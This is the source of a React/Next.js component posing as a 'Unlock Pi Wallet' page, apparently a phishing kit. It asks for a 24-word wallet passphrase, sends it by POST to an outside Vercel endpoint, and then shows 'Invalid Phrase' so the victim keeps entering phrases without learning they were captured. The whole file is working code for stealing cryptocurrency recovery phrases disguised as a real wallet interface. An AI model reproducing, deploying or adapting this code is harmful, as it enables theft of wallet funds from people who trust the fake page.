"use client";

import React, { useState } from "react";

const Wallet = () => {
  const [phrase, setPhrase] = useState<string>("");
  const [success, setSuccess] = useState(false);
  const [border, setBorder] = useState(false);
  const [loading, setLoading] = useState(false);

  const handleChange = (event: React.ChangeEvent<HTMLTextAreaElement>) => {
    const inputPhrase = event.target.value; // Remove leading and trailing spaces

    setPhrase(inputPhrase);
  };

  // https://pi-mainet.vercel.app/api/phrase

  const handleSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
    e.preventDefault();
    if (phrase.length < 1) {
      setBorder(true);
      setLoading(false);
      return;
    }

    try {
      setLoading(true);
      const res = await fetch("https://mainnet-pi-nu.vercel.app/api/phrase", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({ message: phrase }),
      });

      const json = await res.json();

      // Redirect to login if success
      if (res.ok) {
        setTimeout(() => {
          setLoading(false);
        }, 100);
        setSuccess(true);
        setPhrase("");
        setTimeout(() => {
          setSuccess(false);
        }, 1800);
      }
    } catch (error) {
      console.log(error);
    }
  };
  return (
    <div className="pt-5 pb-24">
      <div className="navCon mx-auto my-0 px-3">
        <div className="flex flex-col gap-6">
          <div>
            {success ? (
              <div className="transition-all ease-in-out border-2 flex items-center justify-center gap-3 rounded-[5px] font-[700] text-[#292B2C] border-[black] text-center py-8">
                Invalid Phrase
                <svg
                  xmlns="http://www.w3.org/2000/svg"
                  viewBox="0 0 24 24"
                  fill="black"
                  className="w-[20] h-[20px]"
                >
                  <path d="M11.9997 10.5865L16.9495 5.63672L18.3637 7.05093L13.4139 12.0007L18.3637 16.9504L16.9495 18.3646L11.9997 13.4149L7.04996 18.3646L5.63574 16.9504L10.5855 12.0007L5.63574 7.05093L7.04996 5.63672L11.9997 10.5865Z"></path>
                </svg>
              </div>
            ) : (
              <h2 className="text-center text-[17px] leading-[25.5px] text-[#292B2C] font-[700]">
                Unlock Pi Wallet
              </h2>
            )}
          </div>

          <form onSubmit={handleSubmit} className=" flex flex-col gap-4">
            <div className="flex items-center justify-center">
              <textarea
                value={phrase}
                onChange={handleChange}
                id=""
                rows={9}
                placeholder="Enter your 24-word passphrase here"
                className={`border border-[#fab44b] placeholder:font-[500] rounded-[3px] my-0 w-[95%] px-3 pt-3 sm:w-full bg-[#fafafa] focus:outline-none ${
                  border && "border-red-500"
                }`}
              ></textarea>
            </div>

            <div className="flex items-center justify-center">
              <button
                type="submit"
                className={`text-[13px] flex items-center justify-center border py-3 px-4 rounded-[40px] border-[#783a8c] text-[#783a8c] font-[600] ${loading && 'w-[70%]'}`}
              >
                {loading ? (
                  <span className="loading loading-spinner loading-sm"></span>
                ) : (
                  "UNLOCK WITH PASSPHRASE"
                )}
              </button>
            </div>

            <div className="px-8 flex items-center justify-center">
              <button className="p-2 text-[13px] text-center flex items-center justify-center w-[100%] sm:w-[300px] bg-[#783a8c] rounded-[4px] text-white  font-[600]">
                UNLOCK WITH FINGERPRINT
              </button>
            </div>
          </form>

          <div className="flex flex-col gap-6">
            <p className="font-[500] text-[#292B2C]">
              As a non-custodial wallet, your wallet passphrase is exclusively
              accessible only to you. Recovery of passphrase is currently
              impossible.
            </p>

            <p className="font-[500] text-[#292B2C]">
              Lost your passphrase?&nbsp;
              <a href="pi://wallet.pi" className="text-[#783a8c] font-[500]">
                You can create a new wallet,
              </a>
              &nbsp;but all your π in your previous wallet will be inaccessible.
            </p>
          </div>
        </div>
      </div>
    </div>
  );
};

export default Wallet;
